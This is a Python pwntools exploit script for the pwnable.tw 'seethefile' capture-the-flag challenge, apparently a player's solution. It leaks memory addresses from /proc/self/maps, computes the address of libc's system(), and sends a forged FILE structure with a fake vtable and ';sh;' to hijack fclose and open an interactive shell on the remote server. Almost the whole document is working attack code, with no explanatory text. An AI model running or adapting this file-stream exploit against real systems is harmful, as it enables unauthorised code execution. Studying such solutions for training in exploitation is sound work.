#!/usr/bin/python
from pwn import *

r = remote("chall.pwnable.tw", 10200)
#r = process('./seethefile', env={"LD_PRELOAD":"/lib/i386-linux-gnu/libc.so.6"})
#r = process('./seethefile', env={"LD_PRELOAD":"libc_32.so.6"})


def openfile(filename):
    r.recvuntil("Your choice :")
    r.sendline("1")
    r.recvuntil("What do you want to see :")
    r.sendline(filename)

def readfile():
    r.recvuntil("Your choice :")
    r.sendline("2")

def writefile():
    r.recvuntil("Your choice :")
    r.sendline("3")

def ex(data):
    r.recvuntil("Your choice :")
    r.sendline("5")
    r.recvuntil(":")
    r.sendline(data)

def padding(n):
    return "".join([chr(0x41+i)*4 for i in range(n)])

def zero(n):
	return p32(0x0)*n

openfile("/proc/self/maps")



#### local version
readfile()
writefile()
code = int(r.recvuntil("-")[:-1], 16)
print "code: ", hex(code)
for _ in range(3):	
	print r.recvline()

buf = int(r.recvuntil("-")[:-1], 16) + 0x8
print "buffer: ", hex(buf)


readfile()
writefile()

#print r.recvline()
print r.recvline()
libc_line = r.recvuntil("-")
print libc_line
libc = int(libc_line[:-1], 16)
print r.recvline()
print "libc: ", hex(libc)


#system = libc + 0x3ada0
system = libc + 0x3a940
vtable_addr = buf + 22*4
lock = buf + 0x500
#payload = "AAAA" + ";sh;" + padding(6) + p32(buf) + padding(9) + p32(lock) + p32(vtable_addr) + padding(2) + p32(system)
#print "payload: ", payload

buf = 0x0804B260
vtable_addr = 0x804b2f8 - 0x44
lock = buf + 0x10
#vtable_addr = buf + 39*4
payload = 'aaa;sh;'.ljust(0x20, '\x00') + p32(buf) + zero(9) + p32(lock) + zero(18) + p32(vtable_addr) + p32(system)


raw_input()
ex(payload)
r.recvline()
'''
ibc = ELF('libc_32.so.6')
sh = next(libc.search('sh\x00'))
binsh = next(libc.search('/bin/sh\x00'))
print hex(sh)
print hex(binsh)

'''

r.interactive()

